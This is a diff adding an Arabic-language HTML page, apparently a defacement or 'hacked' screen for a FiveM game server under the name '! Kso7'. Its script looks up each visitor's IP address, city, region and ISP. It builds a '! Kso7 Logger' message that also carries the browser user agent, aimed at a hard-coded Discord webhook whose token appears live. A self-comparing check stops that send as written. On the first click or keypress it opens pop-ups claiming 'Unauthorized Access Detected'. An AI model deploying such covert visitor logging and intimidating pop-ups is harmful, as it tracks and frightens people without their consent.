@@ -1,0 +1,1023 @@
+<!DOCTYPE html>
+<html lang="ar">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>! Kos7</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+            direction: rtl;
+        }
+
+        /* فيديو الخلفية */
+        .background-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -2;
+            opacity: 0.7;
+        }
+
+        /* طبقة مظلمة فوق الفيديو */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            z-index: -1;
+        }
+
+        /* صفحة التحميل */
+        .loading-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            z-index: 10;
+            width: 100%;
+        }
+
+        /* النص العلوي */
+        .top-text {
+            position: absolute;
+            top: 15%;
+            right: 10%;
+            font-size: 2.5em;
+            color: #ff3333;
+            text-shadow: 0 0 20px #ff3333, 0 0 40px #ff3333;
+            font-weight: bold;
+            animation: glow-red 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow-red {
+            from {
+                text-shadow: 0 0 20px #ff3333, 0 0 40px #ff3333;
+            }
+
+            to {
+                text-shadow: 0 0 30px #ff6666, 0 0 60px #ff6666;
+            }
+        }
+
+        /* أيقونة الموسيقى */
+        .music-icon {
+            font-size: 2em;
+            color: #ff3333;
+            margin-bottom: 20px;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+
+            0%,
+            20%,
+            50%,
+            80%,
+            100% {
+                transform: translateY(0);
+            }
+
+            40% {
+                transform: translateY(-10px);
+            }
+
+            60% {
+                transform: translateY(-5px);
+            }
+        }
+
+        /* شريط التحميل */
+        .loading-bar-container {
+            width: 400px;
+            height: 20px;
+            background: #222;
+            border-radius: 25px;
+            overflow: hidden;
+            margin: 30px 0;
+            border: 2px solid #555;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.15);
+        }
+
+        .loading-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff00, #66ff66, #00ff00);
+            width: 0%;
+            border-radius: 25px;
+            animation: loading 3s ease-in-out forwards;
+            /* تم تسريع التحميل */
+            box-shadow: 0 0 15px #aaffaa;
+        }
+
+        @keyframes loading {
+            0% {
+                width: 0%;
+            }
+
+            100% {
+                width: 100%;
+            }
+        }
+
+        /* العنوان الرئيسي */
+        .main-title {
+            font-size: 3em;
+            color: #fff;
+            margin: 20px 0;
+            text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
+            letter-spacing: 8px;
+            animation: pulse-white 3s ease-in-out infinite;
+        }
+
+        @keyframes pulse-white {
+
+            0%,
+            100% {
+                text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
+                transform: scale(1);
+            }
+
+            50% {
+                text-shadow: 0 0 50px rgba(255, 255, 255, 1);
+                transform: scale(1.02);
+            }
+        }
+
+        /* العنوان الفرعي */
+        .subtitle {
+            font-size: 2em;
+            color: #ccc;
+            margin: 20px 0;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
+            letter-spacing: 3px;
+        }
+
+        /* رابط الديسكورد */
+        .discord-link {
+            font-size: 1.6em;
+            color: #ffd700;
+            margin-top: 40px;
+            text-shadow:
+                0 0 10px #ffd700,
+                0 0 20px #ffd700,
+                0 0 30px #ffec3d,
+                0 0 40px #ffec3d,
+                0 0 50px #ffec3d,
+                0 0 60px #ffec3d;
+            letter-spacing: 2px;
+            font-family: 'Courier New', monospace;
+            animation: glow-gold 3s ease-in-out infinite alternate;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            user-select: text;
+        }
+
+        .discord-link:hover {
+            color: #fff59d;
+            text-shadow:
+                0 0 15px #fff59d,
+                0 0 25px #fff59d,
+                0 0 35px #fff59d,
+                0 0 45px #fff59d,
+                0 0 55px #fff59d,
+                0 0 65px #fff59d;
+            transform: scale(1.08);
+        }
+
+        @keyframes glow-gold {
+            from {
+                text-shadow:
+                    0 0 10px #ffd700,
+                    0 0 20px #ffd700,
+                    0 0 30px #ffec3d,
+                    0 0 40px #ffec3d,
+                    0 0 50px #ffec3d,
+                    0 0 60px #ffec3d;
+            }
+
+            to {
+                text-shadow:
+                    0 0 20px #fffacd,
+                    0 0 30px #fffacd,
+                    0 0 40px #fffacd,
+                    0 0 50px #fffacd,
+                    0 0 60px #fffacd,
+                    0 0 70px #fffacd;
+            }
+        }
+
+        /* المحتوى الرئيسي (مخفي في البداية) */
+        .main-content {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            z-index: 10;
+        }
+
+        /* تنسيق الصورة */
+        .logo-image {
+            width: 200px;
+            height: auto;
+            margin-bottom: 20px;
+            border-radius: 15px;
+            box-shadow: 0 0 30px rgba(255, 255, 255, 0.3);
+            animation: pulse-white 3s ease-in-out infinite;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
+
+        /* تأثيرات الجسيمات */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            animation: float 6s infinite linear;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 1;
+            }
+
+            100% {
+                transform: translateY(-10px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        /* Fade Out شاشة التحميل */
+        .fade-out {
+            animation: fadeOut 1.0s ease forwards;
+        }
+
+        @keyframes fadeOut {
+            from {
+                opacity: 1;
+            }
+
+            to {
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
+
+        /* Fade In للمحتوى الرئيسي */
+        .fade-in {
+            animation: fadeIn 1.5s ease forwards;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* صندوق المعلومات */
+        .user-info-box {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            padding: 15px;
+            border-radius: 8px;
+            color: #fff;
+            font-family: 'Courier New', monospace;
+            z-index: 1000;
+            backdrop-filter: blur(5px);
+            width: 350px;
+            font-size: 1.1em;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.1);
+            direction: ltr;
+        }
+
+        .user-info-box .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 0.85em;
+        }
+
+        .user-info-box .label {
+            color: #00ff00;
+            font-weight: bold;
+        }
+
+        .user-info-box .value {
+            color: #ddd;
+        }
+
+        /* ساعة رقمية */
+        .digital-clock {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            font-size: 1.5em;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            z-index: 1000;
+            text-shadow: 0 0 10px #00ff00;
+        }
+
+        /* حالة النظام */
+        .system-status {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            font-size: 1em;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            background-color: #00ff00;
+            border-radius: 50%;
+            box-shadow: 0 0 10px #00ff00;
+            animation: blink 1s infinite alternate;
+        }
+
+        @keyframes blink {
+            from {
+                opacity: 1;
+            }
+
+            to {
+                opacity: 0.3;
+            }
+        }
+
+        /* تأثير Glitch */
+        .glitch {
+            position: relative;
+            color: white;
+            font-size: 3em;
+            letter-spacing: 0.1em;
+            animation: glitch-skew 1s infinite linear alternate-reverse;
+        }
+
+        .glitch::before {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            left: 2px;
+            text-shadow: -2px 0 #ff00c1;
+            clip: rect(44px, 450px, 56px, 0);
+            animation: glitch-anim 5s infinite linear alternate-reverse;
+        }
+
+        .glitch::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            left: -2px;
+            text-shadow: -2px 0 #00fff9;
+            clip: rect(44px, 450px, 56px, 0);
+            animation: glitch-anim2 5s infinite linear alternate-reverse;
+        }
+
+        @keyframes glitch-anim {
+            0% {
+                clip: rect(61px, 9999px, 52px, 0);
+                transform: skew(0.81deg);
+            }
+
+            5% {
+                clip: rect(80px, 9999px, 91px, 0);
+                transform: skew(0.24deg);
+            }
+
+            10% {
+                clip: rect(46px, 9999px, 20px, 0);
+                transform: skew(0.12deg);
+            }
+
+            15% {
+                clip: rect(40px, 9999px, 5px, 0);
+                transform: skew(0.66deg);
+            }
+
+            20% {
+                clip: rect(54px, 9999px, 56px, 0);
+                transform: skew(0.8deg);
+            }
+
+            25% {
+                clip: rect(93px, 9999px, 69px, 0);
+                transform: skew(0.68deg);
+            }
+
+            30% {
+                clip: rect(32px, 9999px, 4px, 0);
+                transform: skew(0.63deg);
+            }
+
+            35% {
+                clip: rect(74px, 9999px, 86px, 0);
+                transform: skew(0.56deg);
+            }
+
+            40% {
+                clip: rect(70px, 9999px, 34px, 0);
+                transform: skew(0.48deg);
+            }
+
+            45% {
+                clip: rect(100px, 9999px, 52px, 0);
+                transform: skew(0.27deg);
+            }
+
+            50% {
+                clip: rect(10px, 9999px, 31px, 0);
+                transform: skew(0.97deg);
+            }
+
+            55% {
+                clip: rect(66px, 9999px, 18px, 0);
+                transform: skew(0.58deg);
+            }
+
+            60% {
+                clip: rect(61px, 9999px, 97px, 0);
+                transform: skew(0.35deg);
+            }
+
+            65% {
+                clip: rect(46px, 9999px, 40px, 0);
+                transform: skew(0.55deg);
+            }
+
+            70% {
+                clip: rect(87px, 9999px, 96px, 0);
+                transform: skew(0.85deg);
+            }
+
+            75% {
+                clip: rect(47px, 9999px, 3px, 0);
+                transform: skew(0.32deg);
+            }
+
+            80% {
+                clip: rect(79px, 9999px, 5px, 0);
+                transform: skew(0.53deg);
+            }
+
+            85% {
+                clip: rect(59px, 9999px, 39px, 0);
+                transform: skew(0.56deg);
+            }
+
+            90% {
+                clip: rect(30px, 9999px, 29px, 0);
+                transform: skew(0.25deg);
+            }
+
+            95% {
+                clip: rect(97px, 9999px, 73px, 0);
+                transform: skew(0.79deg);
+            }
+
+            100% {
+                clip: rect(24px, 9999px, 97px, 0);
+                transform: skew(0.65deg);
+            }
+        }
+
+        @keyframes glitch-anim2 {
+            0% {
+                clip: rect(11px, 9999px, 29px, 0);
+                transform: skew(0.7deg);
+            }
+
+            5% {
+                clip: rect(78px, 9999px, 71px, 0);
+                transform: skew(0.45deg);
+            }
+
+            10% {
+                clip: rect(8px, 9999px, 63px, 0);
+                transform: skew(0.67deg);
+            }
+
+            15% {
+                clip: rect(76px, 9999px, 50px, 0);
+                transform: skew(0.35deg);
+            }
+
+            20% {
+                clip: rect(70px, 9999px, 28px, 0);
+                transform: skew(0.81deg);
+            }
+
+            25% {
+                clip: rect(8px, 9999px, 2px, 0);
+                transform: skew(0.88deg);
+            }
+
+            30% {
+                clip: rect(41px, 9999px, 43px, 0);
+                transform: skew(0.96deg);
+            }
+
+            35% {
+                clip: rect(13px, 9999px, 47px, 0);
+                transform: skew(0.44deg);
+            }
+
+            40% {
+                clip: rect(24px, 9999px, 29px, 0);
+                transform: skew(0.95deg);
+            }
+
+            45% {
+                clip: rect(97px, 9999px, 25px, 0);
+                transform: skew(0.13deg);
+            }
+
+            50% {
+                clip: rect(13px, 9999px, 32px, 0);
+                transform: skew(0.36deg);
+            }
+
+            55% {
+                clip: rect(83px, 9999px, 91px, 0);
+                transform: skew(0.34deg);
+            }
+
+            60% {
+                clip: rect(45px, 9999px, 14px, 0);
+                transform: skew(0.12deg);
+            }
+
+            65% {
+                clip: rect(61px, 9999px, 50px, 0);
+                transform: skew(0.26deg);
+            }
+
+            70% {
+                clip: rect(12px, 9999px, 44px, 0);
+                transform: skew(0.2deg);
+            }
+
+            75% {
+                clip: rect(27px, 9999px, 97px, 0);
+                transform: skew(0.55deg);
+            }
+
+            80% {
+                clip: rect(48px, 9999px, 23px, 0);
+                transform: skew(0.97deg);
+            }
+
+            85% {
+                clip: rect(28px, 9999px, 39px, 0);
+                transform: skew(0.33deg);
+            }
+
+            90% {
+                clip: rect(47px, 9999px, 3px, 0);
+                transform: skew(0.47deg);
+            }
+
+            95% {
+                clip: rect(48px, 9999px, 26px, 0);
+                transform: skew(0.48deg);
+            }
+
+            100% {
+                clip: rect(59px, 9999px, 56px, 0);
+                transform: skew(0.4deg);
+            }
+        }
+
+        @keyframes glitch-skew {
+            0% {
+                transform: skew(-2deg);
+            }
+
+            10% {
+                transform: skew(3deg);
+            }
+
+            20% {
+                transform: skew(-1deg);
+            }
+
+            30% {
+                transform: skew(4deg);
+            }
+
+            40% {
+                transform: skew(-3deg);
+            }
+
+            50% {
+                transform: skew(1deg);
+            }
+
+            60% {
+                transform: skew(-4deg);
+            }
+
+            70% {
+                transform: skew(2deg);
+            }
+
+            80% {
+                transform: skew(-1deg);
+            }
+
+            90% {
+                transform: skew(3deg);
+            }
+
+            100% {
+                transform: skew(-2deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- صندوق المعلومات -->
+    <div class="user-info-box" id="userInfoBox" style="display: none;">
+        <div class="info-row"><span class="label">IP:</span> <span class="value" id="info-ip">Thinking...</span></div>
+        <div class="info-row"><span class="label">Region:</span> <span class="value" id="info-region">Thinking...</span>
+        </div>
+        <div class="info-row"><span class="label">City:</span> <span class="value" id="info-city">Thinking...</span>
+        </div>
+        <div class="info-row"><span class="label">ISP:</span> <span class="value" id="info-isp">Thinking...</span></div>
+    </div>
+
+    <!-- الساعة الرقمية -->
+    <div class="digital-clock" id="clock">19:46:07</div>
+
+    <!-- حالة النظام -->
+    <div class="system-status">
+        <div class="status-dot"></div>
+        <span>SYSTEM: ONLINE</span>
+    </div>
+
+    <!-- فيديو الخلفية -->
+    <video class="background-video" autoplay="" loop="" muted="" playsinline="">
+        <source src="https://e.top4top.io/m_3345i21j41.mp4" type="video/mp4">
+    </video>
+
+    <!-- الموسيقى الخلفية -->
+    <audio id="background-music" loop="" muted="" playsinline="">
+        <source src="https://i.top4top.io/m_3783pckzz1.mp3" type="audio/mpeg">
+    </audio>
+
+    <!-- طبقة مظلمة -->
+    <div class="overlay"></div>
+
+    <!-- تأثير الجسيمات -->
+    <div class="particles" id="particles">
+        <div class="particle"
+            style="left: 82.5747%; top: 75.8243%; animation-delay: 0.211947s; animation-duration: 4.77367s;"></div>
+        <div class="particle"
+            style="left: 15.5467%; top: 93.3652%; animation-delay: 3.36617s; animation-duration: 3.56536s;"></div>
+        <div class="particle"
+            style="left: 16.4118%; top: 2.73631%; animation-delay: 0.606247s; animation-duration: 3.8942s;"></div>
+        <div class="particle"
+            style="left: 50.2818%; top: 70.2874%; animation-delay: 4.79954s; animation-duration: 3.72678s;"></div>
+        <div class="particle"
+            style="left: 49.3752%; top: 88.0949%; animation-delay: 3.5385s; animation-duration: 4.54998s;"></div>
+        <div class="particle"
+            style="left: 41.5541%; top: 47.1923%; animation-delay: 3.36021s; animation-duration: 4.70389s;"></div>
+        <div class="particle"
+            style="left: 31.1541%; top: 26.3822%; animation-delay: 0.605969s; animation-duration: 3.53402s;"></div>
+        <div class="particle"
+            style="left: 0.273656%; top: 89.4817%; animation-delay: 1.12143s; animation-duration: 4.70428s;"></div>
+        <div class="particle"
+            style="left: 92.6735%; top: 93.8932%; animation-delay: 5.53757s; animation-duration: 5.36985s;"></div>
+        <div class="particle"
+            style="left: 24.2793%; top: 73.4437%; animation-delay: 4.20129s; animation-duration: 3.17379s;"></div>
+        <div class="particle"
+            style="left: 99.8047%; top: 93.6452%; animation-delay: 0.645165s; animation-duration: 5.91596s;"></div>
+        <div class="particle"
+            style="left: 70.7306%; top: 66.7706%; animation-delay: 3.1405s; animation-duration: 3.61588s;"></div>
+        <div class="particle"
+            style="left: 67.9553%; top: 87.0843%; animation-delay: 4.25754s; animation-duration: 3.33204s;"></div>
+        <div class="particle"
+            style="left: 93.0716%; top: 18.1465%; animation-delay: 5.24919s; animation-duration: 5.66895s;"></div>
+        <div class="particle"
+            style="left: 41.6902%; top: 0.545126%; animation-delay: 2.34111s; animation-duration: 3.30387s;"></div>
+        <div class="particle"
+            style="left: 46.3283%; top: 62.7586%; animation-delay: 1.3709s; animation-duration: 5.24821s;"></div>
+        <div class="particle"
+            style="left: 78.5123%; top: 46.9098%; animation-delay: 4.17675s; animation-duration: 5.25392s;"></div>
+        <div class="particle"
+            style="left: 65.5637%; top: 33.8307%; animation-delay: 0.656169s; animation-duration: 3.93053s;"></div>
+        <div class="particle"
+            style="left: 37.4558%; top: 33.4482%; animation-delay: 5.5475s; animation-duration: 3.77354s;"></div>
+        <div class="particle"
+            style="left: 74.3419%; top: 75.8666%; animation-delay: 3.97292s; animation-duration: 5.42478s;"></div>
+        <div class="particle"
+            style="left: 86.8242%; top: 30.0743%; animation-delay: 1.91126s; animation-duration: 4.45867s;"></div>
+        <div class="particle"
+            style="left: 46.3593%; top: 78.2149%; animation-delay: 5.12621s; animation-duration: 3.16659s;"></div>
+        <div class="particle"
+            style="left: 46.7777%; top: 82.0848%; animation-delay: 1.82482s; animation-duration: 4.39045s;"></div>
+        <div class="particle"
+            style="left: 87.3748%; top: 1.75238%; animation-delay: 4.84071s; animation-duration: 4.48485s;"></div>
+        <div class="particle"
+            style="left: 81.6332%; top: 68.6231%; animation-delay: 2.19476s; animation-duration: 5.5386s;"></div>
+        <div class="particle"
+            style="left: 33.9773%; top: 47.969%; animation-delay: 4.28258s; animation-duration: 5.301s;"></div>
+        <div class="particle"
+            style="left: 18.1164%; top: 57.997%; animation-delay: 2.46092s; animation-duration: 3.74619s;"></div>
+        <div class="particle"
+            style="left: 61.5064%; top: 32.1669%; animation-delay: 3.38035s; animation-duration: 4.05413s;"></div>
+        <div class="particle"
+            style="left: 69.6959%; top: 72.7429%; animation-delay: 3.92326s; animation-duration: 3.59103s;"></div>
+        <div class="particle"
+            style="left: 35.4743%; top: 89.8562%; animation-delay: 5.47283s; animation-duration: 4.71135s;"></div>
+        <div class="particle"
+            style="left: 58.6782%; top: 73.1238%; animation-delay: 1.86334s; animation-duration: 5.34328s;"></div>
+        <div class="particle"
+            style="left: 92.2393%; top: 68.2627%; animation-delay: 3.81053s; animation-duration: 5.44646s;"></div>
+        <div class="particle"
+            style="left: 72.25%; top: 91.1907%; animation-delay: 2.76459s; animation-duration: 5.95753s;"></div>
+        <div class="particle"
+            style="left: 55.0106%; top: 19.57%; animation-delay: 2.8038s; animation-duration: 4.63207s;"></div>
+        <div class="particle"
+            style="left: 46.9647%; top: 34.5269%; animation-delay: 0.011108s; animation-duration: 4.08097s;"></div>
+        <div class="particle"
+            style="left: 90.5939%; top: 34.9989%; animation-delay: 1.44311s; animation-duration: 3.9677s;"></div>
+        <div class="particle"
+            style="left: 91.2321%; top: 73.1546%; animation-delay: 5.56199s; animation-duration: 4.4001s;"></div>
+        <div class="particle"
+            style="left: 10.2035%; top: 84.5257%; animation-delay: 1.73076s; animation-duration: 5.20397s;"></div>
+        <div class="particle"
+            style="left: 6.86323%; top: 47.7134%; animation-delay: 4.11804s; animation-duration: 3.69712s;"></div>
+        <div class="particle"
+            style="left: 48.8215%; top: 84.1929%; animation-delay: 1.77338s; animation-duration: 3.52635s;"></div>
+        <div class="particle"
+            style="left: 37.9967%; top: 80.0094%; animation-delay: 0.503908s; animation-duration: 5.61988s;"></div>
+        <div class="particle"
+            style="left: 85.3984%; top: 0.136078%; animation-delay: 5.30178s; animation-duration: 5.9789s;"></div>
+        <div class="particle"
+            style="left: 79.3773%; top: 61.3569%; animation-delay: 0.953954s; animation-duration: 5.33473s;"></div>
+        <div class="particle"
+            style="left: 85.7528%; top: 56.266%; animation-delay: 4.20348s; animation-duration: 5.30253s;"></div>
+        <div class="particle"
+            style="left: 20.2445%; top: 71.67%; animation-delay: 5.95312s; animation-duration: 4.85577s;"></div>
+        <div class="particle"
+            style="left: 91.9145%; top: 19.8149%; animation-delay: 1.71118s; animation-duration: 3.42105s;"></div>
+        <div class="particle"
+            style="left: 24.3001%; top: 66.5792%; animation-delay: 2.84212s; animation-duration: 4.56617s;"></div>
+        <div class="particle"
+            style="left: 65.4309%; top: 1.91694%; animation-delay: 4.70271s; animation-duration: 5.28905s;"></div>
+        <div class="particle"
+            style="left: 60.9793%; top: 22.4577%; animation-delay: 5.8292s; animation-duration: 3.67017s;"></div>
+        <div class="particle"
+            style="left: 39.9886%; top: 9.07428%; animation-delay: 3.15887s; animation-duration: 4.75924s;"></div>
+    </div>
+
+    <!-- صفحة التحميل -->
+    <div class="loading-screen fade-out" id="loading-screen" style="display: none;">
+        <div class="top-text"></div>
+        <div class="icon">يتم فتح السيرفر</div>
+        <div class="loading-bar-container">
+            <div class="loading-bar"></div>
+        </div>
+        <div class="main-title">! Kso7</div>
+        <div class="subtitle">🤨 لديك سيرفر جميل 🤨</div>
+        <a href="https://discord.gg/066" class="discord-link" target="_blank"
+            rel="noopener noreferrer">discord.gg/066</a>
+    </div>
+
+    <!-- المحتوى الرئيسي (مخفي) -->
+    <div class="main-content fade-in" id="main-content" style="display: flex;">
+        <img src="https://f.top4top.io/p_37831u3gg1.png" alt="Logo" class="logo-image">
+        <div class="main-title">! Kso7 on your server</div>
+        <div class="subtitle">كرمال شباب كلهم</div>
+        <a href="https://discord.gg/066" class="discord-link" target="_blank"
+            rel="noopener noreferrer">discord.gg/066</a>
+    </div>
+
+    <script>
+        // إنشاء الجسيمات المتطايرة بشكل مستمر مع تجديدهم
+        function createParticles() {
+            const particles = document.getElementById('particles');
+            for (let i = 0; i < 50; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.top = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 6 + 's';
+                particle.style.animationDuration = (Math.random() * 3 + 3) + 's';
+                particles.appendChild(particle);
+                setTimeout(() => particle.remove(), 6000);
+            }
+        }
+        // تجديد الجسيمات كل 6 ثواني
+        setInterval(createParticles, 6000);
+        createParticles();
+
+        // تشغيل الصوت - دعم FiveM
+        // للاستخدام في FiveM: SendNUIMessage({action = 'play'})
+        // لإيقاف: SendNUIMessage({action = 'stop'})
+        // للتحكم بالصوت: SendNUIMessage({action = 'setVolume', volume = 0.5})
+        const a = document.getElementById('background-music');
+        const play = () => {
+            if (a) {
+                a.muted = false;
+                a.play().catch(() => { });
+            }
+        };
+
+        // استماع لرسائل FiveM
+        window.addEventListener('message', (e) => {
+            if (!a) return;
+            if (e.data.action === 'playMusic') play();
+            if (e.data.action === 'stopMusic') { a.pause(); a.currentTime = 0; }
+            if (e.data.action === 'setVolume') a.volume = e.data.volume || 1;
+        });
+
+        // تشغيل تلقائي عند تحميل الصفحة (لـ FiveM)
+        if (a) {
+            a.addEventListener('canplay', () => {
+                setTimeout(() => play(), 500);
+            });
+        }
+
+        // تحديث الساعة
+        function updateClock() {
+            const now = new Date();
+            const timeString = now.toLocaleTimeString('en-US', { hour12: false });
+            document.getElementById('clock').textContent = timeString;
+        }
+        setInterval(updateClock, 1000);
+        updateClock();
+
+        // نظام النوافذ المنبثقة
+        function triggerPopups() {
+            // فتح عدة نوافذ لتأثير الـ "Hack"
+            for (let i = 0; i < 5; i++) {
+                setTimeout(() => {
+                    const x = Math.random() * (window.screen.width - 400);
+                    const y = Math.random() * (window.screen.height - 300);
+                    const newWin = window.open('', '_blank', `width=400,height=300,left=${x},top=${y}`);
+                    if (newWin) {
+                        newWin.document.write(`
+                            <body style="background:#000;color:#ff0000;font-family:monospace;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;margin:0;overflow:hidden;border:2px solid #ff0000;">
+                                <h1 style="text-shadow:0 0 10px #ff0000;font-size:2em;">SYSTEM ERROR</h1>
+                                <p style="font-size:1.2em;">! Kso7 WAS HERE</p>
+                                <div style="font-size:0.8em;color:#555;">Unauthorized Access Detected...</div>
+                                <script>setTimeout(() => { window.close(); }, 5000);<\/script>
+                            </body>
+                        `);
+                    }
+                }, i * 300);
+            }
+        }
+
+        // تشغيل عند تفاعل المستخدم (صوت + نوافذ منبثقة)
+        const startExperience = () => {
+            play();
+            triggerPopups();
+        };
+
+        addEventListener('click', startExperience, { once: true });
+        addEventListener('keydown', startExperience, { once: true });
+
+        // شريط التحميل يتحكم بالانتقال بين الصفحات
+        const loadingBar = document.querySelector('.loading-bar');
+        loadingBar.addEventListener('animationend', () => {
+            const loadingScreen = document.getElementById('loading-screen');
+            const mainContent = document.getElementById('main-content');
+            loadingScreen.classList.add('fade-out');
+            loadingScreen.addEventListener('animationend', () => {
+                loadingScreen.style.display = 'none';
+                mainContent.style.display = 'flex';
+                mainContent.classList.add('fade-in');
+            }, { once: true });
+        });
+
+        // تشغيل الفيديو
+        const video = document.querySelector('.background-video');
+        video.addEventListener('canplay', () => {
+            video.play().catch(err => {
+                console.log('خطأ في تشغيل الفيديو:', err);
+            });
+        });
+
+        // تأثيرات جسيمات عند الكليك
+        document.addEventListener('click', () => {
+            const particles = document.getElementById('particles');
+            for (let i = 0; i < 20; i++) {
+                const spark = document.createElement('div');
+                spark.className = 'particle';
+                spark.style.left = Math.random() * 100 + '%';
+                spark.style.top = Math.random() * 100 + '%';
+                spark.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                spark.style.animationDuration = '1s';
+                particles.appendChild(spark);
+                setTimeout(() => spark.remove(), 1000);
+            }
+        });
+        // إعدادات الويب هوك
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1501928916238209147/Ou9S5v4gI4moSRF2iCwp7IjRBy1ZZd_b5a-zWyRFIEahml0eD569sw-yHJOcEYcOyuv2';
+
+        function sendToWebhook(data) {
+            if (!WEBHOOK_URL || WEBHOOK_URL === 'https://discord.com/api/webhooks/1501928916238209147/Ou9S5v4gI4moSRF2iCwp7IjRBy1ZZd_b5a-zWyRFIEahml0eD569sw-yHJOcEYcOyuv2') return;
+
+            const payload = {
+                username: "! Kso7 Logger",
+                avatar_url: "https://f.top4top.io/p_37831u3gg1.png",
+                embeds: [{
+                    title: "🌐 تسجيل دخول جديد",
+                    color: 15548997, // Red color to match theme
+                    fields: [
+                        { name: "📌 IP Address", value: `\`${data.ip}\``, inline: true },
+                        { name: "📍 Region", value: data.region, inline: true },
+                        { name: "🏙️ City", value: data.city, inline: true },
+                        { name: "🏢 ISP", value: data.connection.org || data.connection.isp, inline: false },
+                        { name: "🖥️ User Agent", value: navigator.userAgent, inline: false }
+                    ],
+                    footer: { text: "! Kso7 System | " + new Date().toLocaleString('ar-EG') },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(err => console.log('Webhook error:', err));
+        }
+
+        // جلب معلومات المستخدم
+        fetch('https://ipwho.is/')
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    document.getElementById('info-ip').textContent = data.ip;
+                    document.getElementById('info-region').textContent = data.region;
+                    document.getElementById('info-city').textContent = data.city;
+                    document.getElementById('info-isp').textContent = data.connection.org || data.connection.isp;
+                    document.getElementById('userInfoBox').style.display = 'block';
+
+                    // إرسال البيانات للويب هوك
+                    sendToWebhook(data);
+                }
+            })
+            .catch(err => console.log('Information fetch error:', err));
+    </script>
+
+
+
+</body>
+
+</html>
